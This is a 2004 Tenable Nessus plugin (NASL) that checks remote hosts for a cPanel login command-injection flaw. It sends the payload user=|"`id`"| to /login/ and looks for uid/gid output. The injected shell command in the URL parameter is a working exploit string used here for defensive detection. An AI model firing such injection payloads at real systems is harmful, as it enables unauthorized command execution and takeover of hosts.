#
# (C) Tenable Network Security
#
# 

if(description)
{
 script_id(12097);
 script_bugtraq_id(9848, 9853, 9855);
 script_version("$Revision: 1.5 $");

 name["english"] = "cPanel Login Command Execution";
 script_name(english:name["english"]);
 
 desc["english"] = '
The remote host is running cPanel.

There is a bug in this software which may allow an attacker to execute arbitrary
commands on this host with the privileges of the cPanel web server, by sending
a malformed login as in :

	http://www.example.com:2082/login/?user=|"`id`"|


An attacker may exploit this flaw to execute arbitrary commands on the remote
host and take its control.

Solution : Upgrade to the newest version of cPanel or disable this service
Risk factor : High';


 script_description(english:desc["english"]);
 
 summary["english"] = "Command Injection";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 2082);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:2082);
if(!get_port_state(port))exit(0);

req = http_get(item:'/login/?user=|"`id`"|', port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
if ( res == NULL ) exit(0);

if ( egrep(pattern:"uid=[0-9].*gid=[0-9]", string:res) ) security_hole(port);

